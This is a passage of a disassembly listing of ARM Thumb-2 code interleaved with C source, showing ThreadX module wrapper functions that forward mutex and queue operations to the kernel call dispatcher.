 8020a70:	681c      	ldr	r4, [r3, #0]
 8020a72:	68f9      	ldr	r1, [r7, #12]
 8020a74:	68ba      	ldr	r2, [r7, #8]
 8020a76:	f107 0314 	add.w	r3, r7, #20
 8020a7a:	201a      	movs	r0, #26
 8020a7c:	47a0      	blx	r4
 8020a7e:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 8020a80:	69fb      	ldr	r3, [r7, #28]
}
 8020a82:	4618      	mov	r0, r3
 8020a84:	3724      	adds	r7, #36	; 0x24
 8020a86:	46bd      	mov	sp, r7
 8020a88:	bd90      	pop	{r4, r7, pc}
 8020a8a:	bf00      	nop
 8020a8c:	00000004 	.word	0x00000004

08020a90 <_txe_mutex_delete>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_mutex_delete(TX_MUTEX *mutex_ptr)
{
 8020a90:	b590      	push	{r4, r7, lr}
 8020a92:	b085      	sub	sp, #20
 8020a94:	af00      	add	r7, sp, #0
 8020a96:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MUTEX_DELETE_CALL, (ALIGN_TYPE) mutex_ptr, 0, 0);
 8020a98:	4b07      	ldr	r3, [pc, #28]	; (8020ab8 <_txe_mutex_delete+0x28>)
 8020a9a:	f859 3003 	ldr.w	r3, [r9, r3]
 8020a9e:	681c      	ldr	r4, [r3, #0]
 8020aa0:	6879      	ldr	r1, [r7, #4]
 8020aa2:	2300      	movs	r3, #0
 8020aa4:	2200      	movs	r2, #0
 8020aa6:	201b      	movs	r0, #27
 8020aa8:	47a0      	blx	r4
 8020aaa:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020aac:	68fb      	ldr	r3, [r7, #12]
}
 8020aae:	4618      	mov	r0, r3
 8020ab0:	3714      	adds	r7, #20
 8020ab2:	46bd      	mov	sp, r7
 8020ab4:	bd90      	pop	{r4, r7, pc}
 8020ab6:	bf00      	nop
 8020ab8:	00000004 	.word	0x00000004

08020abc <_txe_mutex_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_mutex_get(TX_MUTEX *mutex_ptr, ULONG wait_option)
{
 8020abc:	b590      	push	{r4, r7, lr}
 8020abe:	b085      	sub	sp, #20
 8020ac0:	af00      	add	r7, sp, #0
 8020ac2:	6078      	str	r0, [r7, #4]
 8020ac4:	6039      	str	r1, [r7, #0]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MUTEX_GET_CALL, (ALIGN_TYPE) mutex_ptr, (ALIGN_TYPE) wait_option, 0);
 8020ac6:	4b07      	ldr	r3, [pc, #28]	; (8020ae4 <_txe_mutex_get+0x28>)
 8020ac8:	f859 3003 	ldr.w	r3, [r9, r3]
 8020acc:	681c      	ldr	r4, [r3, #0]
 8020ace:	6879      	ldr	r1, [r7, #4]
 8020ad0:	2300      	movs	r3, #0
 8020ad2:	683a      	ldr	r2, [r7, #0]
 8020ad4:	201c      	movs	r0, #28
 8020ad6:	47a0      	blx	r4
 8020ad8:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020ada:	68fb      	ldr	r3, [r7, #12]
}
 8020adc:	4618      	mov	r0, r3
 8020ade:	3714      	adds	r7, #20
 8020ae0:	46bd      	mov	sp, r7
 8020ae2:	bd90      	pop	{r4, r7, pc}
 8020ae4:	00000004 	.word	0x00000004

08020ae8 <_txe_mutex_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_mutex_info_get(TX_MUTEX *mutex_ptr, CHAR **name, ULONG *count, TX_THREAD **owner, TX_THREAD **first_suspended, ULONG *suspended_count, TX_MUTEX **next_mutex)
{
 8020ae8:	b590      	push	{r4, r7, lr}
 8020aea:	b08b      	sub	sp, #44	; 0x2c
 8020aec:	af00      	add	r7, sp, #0
 8020aee:	60f8      	str	r0, [r7, #12]
 8020af0:	60b9      	str	r1, [r7, #8]
 8020af2:	607a      	str	r2, [r7, #4]
 8020af4:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[5];

    extra_parameters[0] = (ALIGN_TYPE) count;
 8020af6:	687b      	ldr	r3, [r7, #4]
 8020af8:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) owner;
 8020afa:	683b      	ldr	r3, [r7, #0]
 8020afc:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) first_suspended;
 8020afe:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8020b00:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) suspended_count;
 8020b02:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8020b04:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) next_mutex;
 8020b06:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8020b08:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MUTEX_INFO_GET_CALL, (ALIGN_TYPE) mutex_ptr, (ALIGN_TYPE) name, (ALIGN_TYPE) extra_parameters);
 8020b0a:	4b08      	ldr	r3, [pc, #32]	; (8020b2c <_txe_mutex_info_get+0x44>)
 8020b0c:	f859 3003 	ldr.w	r3, [r9, r3]
 8020b10:	681c      	ldr	r4, [r3, #0]
 8020b12:	68f9      	ldr	r1, [r7, #12]
 8020b14:	68ba      	ldr	r2, [r7, #8]
 8020b16:	f107 0310 	add.w	r3, r7, #16
 8020b1a:	201d      	movs	r0, #29
 8020b1c:	47a0      	blx	r4
 8020b1e:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8020b20:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 8020b22:	4618      	mov	r0, r3
 8020b24:	372c      	adds	r7, #44	; 0x2c
 8020b26:	46bd      	mov	sp, r7
 8020b28:	bd90      	pop	{r4, r7, pc}
 8020b2a:	bf00      	nop
 8020b2c:	00000004 	.word	0x00000004

08020b30 <_tx_mutex_performance_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_mutex_performance_info_get(TX_MUTEX *mutex_ptr, ULONG *puts, ULONG *gets, ULONG *suspensions, ULONG *timeouts, ULONG *inversions, ULONG *inheritances)
{
 8020b30:	b590      	push	{r4, r7, lr}
 8020b32:	b08b      	sub	sp, #44	; 0x2c
 8020b34:	af00      	add	r7, sp, #0
 8020b36:	60f8      	str	r0, [r7, #12]
 8020b38:	60b9      	str	r1, [r7, #8]
 8020b3a:	607a      	str	r2, [r7, #4]
 8020b3c:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[5];

    extra_parameters[0] = (ALIGN_TYPE) gets;
 8020b3e:	687b      	ldr	r3, [r7, #4]
 8020b40:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) suspensions;
 8020b42:	683b      	ldr	r3, [r7, #0]
 8020b44:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) timeouts;
 8020b46:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8020b48:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) inversions;
 8020b4a:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8020b4c:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) inheritances;
 8020b4e:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8020b50:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MUTEX_PERFORMANCE_INFO_GET_CALL, (ALIGN_TYPE) mutex_ptr, (ALIGN_TYPE) puts, (ALIGN_TYPE) extra_parameters);
 8020b52:	4b08      	ldr	r3, [pc, #32]	; (8020b74 <_tx_mutex_performance_info_get+0x44>)
 8020b54:	f859 3003 	ldr.w	r3, [r9, r3]
 8020b58:	681c      	ldr	r4, [r3, #0]
 8020b5a:	68f9      	ldr	r1, [r7, #12]
 8020b5c:	68ba      	ldr	r2, [r7, #8]
 8020b5e:	f107 0310 	add.w	r3, r7, #16
 8020b62:	201e      	movs	r0, #30
 8020b64:	47a0      	blx	r4
 8020b66:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8020b68:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 8020b6a:	4618      	mov	r0, r3
 8020b6c:	372c      	adds	r7, #44	; 0x2c
 8020b6e:	46bd      	mov	sp, r7
 8020b70:	bd90      	pop	{r4, r7, pc}
 8020b72:	bf00      	nop
 8020b74:	00000004 	.word	0x00000004

08020b78 <_tx_mutex_performance_system_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_mutex_performance_system_info_get(ULONG *puts, ULONG *gets, ULONG *suspensions, ULONG *timeouts, ULONG *inversions, ULONG *inheritances)
{
 8020b78:	b590      	push	{r4, r7, lr}
 8020b7a:	b08b      	sub	sp, #44	; 0x2c
 8020b7c:	af00      	add	r7, sp, #0
 8020b7e:	60f8      	str	r0, [r7, #12]
 8020b80:	60b9      	str	r1, [r7, #8]
 8020b82:	607a      	str	r2, [r7, #4]
 8020b84:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[4];

    extra_parameters[0] = (ALIGN_TYPE) suspensions;
 8020b86:	687b      	ldr	r3, [r7, #4]
 8020b88:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) timeouts;
 8020b8a:	683b      	ldr	r3, [r7, #0]
 8020b8c:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) inversions;
 8020b8e:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8020b90:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) inheritances;
 8020b92:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8020b94:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MUTEX_PERFORMANCE_SYSTEM_INFO_GET_CALL, (ALIGN_TYPE) puts, (ALIGN_TYPE) gets, (ALIGN_TYPE) extra_parameters);
 8020b96:	4b08      	ldr	r3, [pc, #32]	; (8020bb8 <_tx_mutex_performance_system_info_get+0x40>)
 8020b98:	f859 3003 	ldr.w	r3, [r9, r3]
 8020b9c:	681c      	ldr	r4, [r3, #0]
 8020b9e:	68f9      	ldr	r1, [r7, #12]
 8020ba0:	68ba      	ldr	r2, [r7, #8]
 8020ba2:	f107 0314 	add.w	r3, r7, #20
 8020ba6:	201f      	movs	r0, #31
 8020ba8:	47a0      	blx	r4
 8020baa:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8020bac:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 8020bae:	4618      	mov	r0, r3
 8020bb0:	372c      	adds	r7, #44	; 0x2c
 8020bb2:	46bd      	mov	sp, r7
 8020bb4:	bd90      	pop	{r4, r7, pc}
 8020bb6:	bf00      	nop
 8020bb8:	00000004 	.word	0x00000004

08020bbc <_txe_mutex_prioritize>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_mutex_prioritize(TX_MUTEX *mutex_ptr)
{
 8020bbc:	b590      	push	{r4, r7, lr}
 8020bbe:	b085      	sub	sp, #20
 8020bc0:	af00      	add	r7, sp, #0
 8020bc2:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MUTEX_PRIORITIZE_CALL, (ALIGN_TYPE) mutex_ptr, 0, 0);
 8020bc4:	4b07      	ldr	r3, [pc, #28]	; (8020be4 <_txe_mutex_prioritize+0x28>)
 8020bc6:	f859 3003 	ldr.w	r3, [r9, r3]
 8020bca:	681c      	ldr	r4, [r3, #0]
 8020bcc:	6879      	ldr	r1, [r7, #4]
 8020bce:	2300      	movs	r3, #0
 8020bd0:	2200      	movs	r2, #0
 8020bd2:	2020      	movs	r0, #32
 8020bd4:	47a0      	blx	r4
 8020bd6:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020bd8:	68fb      	ldr	r3, [r7, #12]
}
 8020bda:	4618      	mov	r0, r3
 8020bdc:	3714      	adds	r7, #20
 8020bde:	46bd      	mov	sp, r7
 8020be0:	bd90      	pop	{r4, r7, pc}
 8020be2:	bf00      	nop
 8020be4:	00000004 	.word	0x00000004

08020be8 <_txe_mutex_put>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_mutex_put(TX_MUTEX *mutex_ptr)
{
 8020be8:	b590      	push	{r4, r7, lr}
 8020bea:	b085      	sub	sp, #20
 8020bec:	af00      	add	r7, sp, #0
 8020bee:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MUTEX_PUT_CALL, (ALIGN_TYPE) mutex_ptr, 0, 0);
 8020bf0:	4b07      	ldr	r3, [pc, #28]	; (8020c10 <_txe_mutex_put+0x28>)
 8020bf2:	f859 3003 	ldr.w	r3, [r9, r3]
 8020bf6:	681c      	ldr	r4, [r3, #0]
 8020bf8:	6879      	ldr	r1, [r7, #4]
 8020bfa:	2300      	movs	r3, #0
 8020bfc:	2200      	movs	r2, #0
 8020bfe:	2021      	movs	r0, #33	; 0x21
 8020c00:	47a0      	blx	r4
 8020c02:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020c04:	68fb      	ldr	r3, [r7, #12]
}
 8020c06:	4618      	mov	r0, r3
 8020c08:	3714      	adds	r7, #20
 8020c0a:	46bd      	mov	sp, r7
 8020c0c:	bd90      	pop	{r4, r7, pc}
 8020c0e:	bf00      	nop
 8020c10:	00000004 	.word	0x00000004

08020c14 <_txe_queue_create>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_create(TX_QUEUE *queue_ptr, CHAR *name_ptr, UINT message_size, VOID *queue_start, ULONG queue_size, UINT queue_control_block_size)
{
 8020c14:	b590      	push	{r4, r7, lr}
 8020c16:	b08b      	sub	sp, #44	; 0x2c
 8020c18:	af00      	add	r7, sp, #0
 8020c1a:	60f8      	str	r0, [r7, #12]
 8020c1c:	60b9      	str	r1, [r7, #8]
 8020c1e:	607a      	str	r2, [r7, #4]
 8020c20:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[4];

    extra_parameters[0] = (ALIGN_TYPE) message_size;
 8020c22:	687b      	ldr	r3, [r7, #4]
 8020c24:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) queue_start;
 8020c26:	683b      	ldr	r3, [r7, #0]
 8020c28:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) queue_size;
 8020c2a:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8020c2c:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) queue_control_block_size;
 8020c2e:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8020c30:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_CREATE_CALL, (ALIGN_TYPE) queue_ptr, (ALIGN_TYPE) name_ptr, (ALIGN_TYPE) extra_parameters);
 8020c32:	4b08      	ldr	r3, [pc, #32]	; (8020c54 <_txe_queue_create+0x40>)
 8020c34:	f859 3003 	ldr.w	r3, [r9, r3]
 8020c38:	681c      	ldr	r4, [r3, #0]
 8020c3a:	68f9      	ldr	r1, [r7, #12]
 8020c3c:	68ba      	ldr	r2, [r7, #8]
 8020c3e:	f107 0314 	add.w	r3, r7, #20
 8020c42:	2022      	movs	r0, #34	; 0x22
 8020c44:	47a0      	blx	r4
 8020c46:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8020c48:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 8020c4a:	4618      	mov	r0, r3
 8020c4c:	372c      	adds	r7, #44	; 0x2c
 8020c4e:	46bd      	mov	sp, r7
 8020c50:	bd90      	pop	{r4, r7, pc}
 8020c52:	bf00      	nop
 8020c54:	00000004 	.word	0x00000004

08020c58 <_txe_queue_delete>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_delete(TX_QUEUE *queue_ptr)
{
 8020c58:	b590      	push	{r4, r7, lr}
 8020c5a:	b085      	sub	sp, #20
 8020c5c:	af00      	add	r7, sp, #0
 8020c5e:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_DELETE_CALL, (ALIGN_TYPE) queue_ptr, 0, 0);
 8020c60:	4b07      	ldr	r3, [pc, #28]	; (8020c80 <_txe_queue_delete+0x28>)
 8020c62:	f859 3003 	ldr.w	r3, [r9, r3]
 8020c66:	681c      	ldr	r4, [r3, #0]
 8020c68:	6879      	ldr	r1, [r7, #4]
 8020c6a:	2300      	movs	r3, #0
 8020c6c:	2200      	movs	r2, #0
 8020c6e:	2023      	movs	r0, #35	; 0x23
 8020c70:	47a0      	blx	r4
 8020c72:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020c74:	68fb      	ldr	r3, [r7, #12]
}
 8020c76:	4618      	mov	r0, r3
 8020c78:	3714      	adds	r7, #20
 8020c7a:	46bd      	mov	sp, r7
 8020c7c:	bd90      	pop	{r4, r7, pc}
 8020c7e:	bf00      	nop
 8020c80:	00000004 	.word	0x00000004

08020c84 <_txe_queue_flush>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_flush(TX_QUEUE *queue_ptr)
{
 8020c84:	b590      	push	{r4, r7, lr}
 8020c86:	b085      	sub	sp, #20
 8020c88:	af00      	add	r7, sp, #0
 8020c8a:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_FLUSH_CALL, (ALIGN_TYPE) queue_ptr, 0, 0);
 8020c8c:	4b07      	ldr	r3, [pc, #28]	; (8020cac <_txe_queue_flush+0x28>)
 8020c8e:	f859 3003 	ldr.w	r3, [r9, r3]
 8020c92:	681c      	ldr	r4, [r3, #0]
 8020c94:	6879      	ldr	r1, [r7, #4]
 8020c96:	2300      	movs	r3, #0
 8020c98:	2200      	movs	r2, #0
 8020c9a:	2024      	movs	r0, #36	; 0x24
 8020c9c:	47a0      	blx	r4
 8020c9e:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020ca0:	68fb      	ldr	r3, [r7, #12]
}
 8020ca2:	4618      	mov	r0, r3
 8020ca4:	3714      	adds	r7, #20
 8020ca6:	46bd      	mov	sp, r7
 8020ca8:	bd90      	pop	{r4, r7, pc}
 8020caa:	bf00      	nop
 8020cac:	00000004 	.word	0x00000004

08020cb0 <_txe_queue_front_send>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_front_send(TX_QUEUE *queue_ptr, VOID *source_ptr, ULONG wait_option)
{
 8020cb0:	b590      	push	{r4, r7, lr}
 8020cb2:	b087      	sub	sp, #28
 8020cb4:	af00      	add	r7, sp, #0
 8020cb6:	60f8      	str	r0, [r7, #12]
 8020cb8:	60b9      	str	r1, [r7, #8]
 8020cba:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_FRONT_SEND_CALL, (ALIGN_TYPE) queue_ptr, (ALIGN_TYPE) source_ptr, (ALIGN_TYPE) wait_option);
 8020cbc:	4b07      	ldr	r3, [pc, #28]	; (8020cdc <_txe_queue_front_send+0x2c>)
 8020cbe:	f859 3003 	ldr.w	r3, [r9, r3]
 8020cc2:	681c      	ldr	r4, [r3, #0]
 8020cc4:	68f9      	ldr	r1, [r7, #12]
 8020cc6:	68ba      	ldr	r2, [r7, #8]
 8020cc8:	687b      	ldr	r3, [r7, #4]
 8020cca:	2025      	movs	r0, #37	; 0x25
 8020ccc:	47a0      	blx	r4
 8020cce:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 8020cd0:	697b      	ldr	r3, [r7, #20]
}
 8020cd2:	4618      	mov	r0, r3
 8020cd4:	371c      	adds	r7, #28
 8020cd6:	46bd      	mov	sp, r7
 8020cd8:	bd90      	pop	{r4, r7, pc}
 8020cda:	bf00      	nop
 8020cdc:	00000004 	.word	0x00000004

08020ce0 <_txe_queue_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_info_get(TX_QUEUE *queue_ptr, CHAR **name, ULONG *enqueued, ULONG *available_storage, TX_THREAD **first_suspended, ULONG *suspended_count, TX_QUEUE **next_queue)
{
 8020ce0:	b590      	push	{r4, r7, lr}
 8020ce2:	b08b      	sub	sp, #44	; 0x2c
 8020ce4:	af00      	add	r7, sp, #0
 8020ce6:	60f8      	str	r0, [r7, #12]
 8020ce8:	60b9      	str	r1, [r7, #8]
 8020cea:	607a      	str	r2, [r7, #4]
 8020cec:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[5];

    extra_parameters[0] = (ALIGN_TYPE) enqueued;
 8020cee:	687b      	ldr	r3, [r7, #4]
 8020cf0:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) available_storage;
 8020cf2:	683b      	ldr	r3, [r7, #0]
 8020cf4:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) first_suspended;
 8020cf6:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8020cf8:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) suspended_count;
 8020cfa:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8020cfc:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) next_queue;
 8020cfe:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8020d00:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_INFO_GET_CALL, (ALIGN_TYPE) queue_ptr, (ALIGN_TYPE) name, (ALIGN_TYPE) extra_parameters);
 8020d02:	4b08      	ldr	r3, [pc, #32]	; (8020d24 <_txe_queue_info_get+0x44>)
 8020d04:	f859 3003 	ldr.w	r3, [r9, r3]
 8020d08:	681c      	ldr	r4, [r3, #0]
 8020d0a:	68f9      	ldr	r1, [r7, #12]
 8020d0c:	68ba      	ldr	r2, [r7, #8]
 8020d0e:	f107 0310 	add.w	r3, r7, #16
 8020d12:	2026      	movs	r0, #38	; 0x26
 8020d14:	47a0      	blx	r4
 8020d16:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8020d18:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 8020d1a:	4618      	mov	r0, r3
 8020d1c:	372c      	adds	r7, #44	; 0x2c
 8020d1e:	46bd      	mov	sp, r7
 8020d20:	bd90      	pop	{r4, r7, pc}
 8020d22:	bf00      	nop
 8020d24:	00000004 	.word	0x00000004

08020d28 <_tx_queue_performance_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_queue_performance_info_get(TX_QUEUE *queue_ptr, ULONG *messages_sent, ULONG *messages_received, ULONG *empty_suspensions, ULONG *full_suspensions, ULONG *full_errors, ULONG *timeouts)
{
 8020d28:	b590      	push	{r4, r7, lr}
 8020d2a:	b08b      	sub	sp, #44	; 0x2c
 8020d2c:	af00      	add	r7, sp, #0
 8020d2e:	60f8      	str	r0, [r7, #12]
 8020d30:	60b9      	str	r1, [r7, #8]
 8020d32:	607a      	str	r2, [r7, #4]
 8020d34:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[5];

    extra_parameters[0] = (ALIGN_TYPE) messages_received;
 8020d36:	687b      	ldr	r3, [r7, #4]
 8020d38:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) empty_suspensions;
 8020d3a:	683b      	ldr	r3, [r7, #0]
 8020d3c:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) full_suspensions;
 8020d3e:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8020d40:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) full_errors;
 8020d42:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8020d44:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) timeouts;
 8020d46:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8020d48:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_PERFORMANCE_INFO_GET_CALL, (ALIGN_TYPE) queue_ptr, (ALIGN_TYPE) messages_sent, (ALIGN_TYPE) extra_parameters);
 8020d4a:	4b08      	ldr	r3, [pc, #32]	; (8020d6c <_tx_queue_performance_info_get+0x44>)
 8020d4c:	f859 3003 	ldr.w	r3, [r9, r3]
 8020d50:	681c      	ldr	r4, [r3, #0]
 8020d52:	68f9      	ldr	r1, [r7, #12]
 8020d54:	68ba      	ldr	r2, [r7, #8]
 8020d56:	f107 0310 	add.w	r3, r7, #16
 8020d5a:	2027      	movs	r0, #39	; 0x27
 8020d5c:	47a0      	blx	r4
 8020d5e:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8020d60:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 8020d62:	4618      	mov	r0, r3
 8020d64:	372c      	adds	r7, #44	; 0x2c
 8020d66:	46bd      	mov	sp, r7
 8020d68:	bd90      	pop	{r4, r7, pc}
 8020d6a:	bf00      	nop
 8020d6c:	00000004 	.word	0x00000004

08020d70 <_tx_queue_performance_system_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_queue_performance_system_info_get(ULONG *messages_sent, ULONG *messages_received, ULONG *empty_suspensions, ULONG *full_suspensions, ULONG *full_errors, ULONG *timeouts)
{
 8020d70:	b590      	push	{r4, r7, lr}
 8020d72:	b08b      	sub	sp, #44	; 0x2c
 8020d74:	af00      	add	r7, sp, #0
 8020d76:	60f8      	str	r0, [r7, #12]
 8020d78:	60b9      	str	r1, [r7, #8]
 8020d7a:	607a      	str	r2, [r7, #4]
 8020d7c:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[4];

    extra_parameters[0] = (ALIGN_TYPE) empty_suspensions;
 8020d7e:	687b      	ldr	r3, [r7, #4]
 8020d80:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) full_suspensions;
 8020d82:	683b      	ldr	r3, [r7, #0]
 8020d84:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) full_errors;
 8020d86:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8020d88:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) timeouts;
 8020d8a:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8020d8c:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_PERFORMANCE_SYSTEM_INFO_GET_CALL, (ALIGN_TYPE) messages_sent, (ALIGN_TYPE) messages_received, (ALIGN_TYPE) extra_parameters);
 8020d8e:	4b08      	ldr	r3, [pc, #32]	; (8020db0 <_tx_queue_performance_system_info_get+0x40>)
 8020d90:	f859 3003 	ldr.w	r3, [r9, r3]
 8020d94:	681c      	ldr	r4, [r3, #0]
 8020d96:	68f9      	ldr	r1, [r7, #12]
 8020d98:	68ba      	ldr	r2, [r7, #8]
 8020d9a:	f107 0314 	add.w	r3, r7, #20
 8020d9e:	2028      	movs	r0, #40	; 0x28
 8020da0:	47a0      	blx	r4
 8020da2:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8020da4:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 8020da6:	4618      	mov	r0, r3
 8020da8:	372c      	adds	r7, #44	; 0x2c
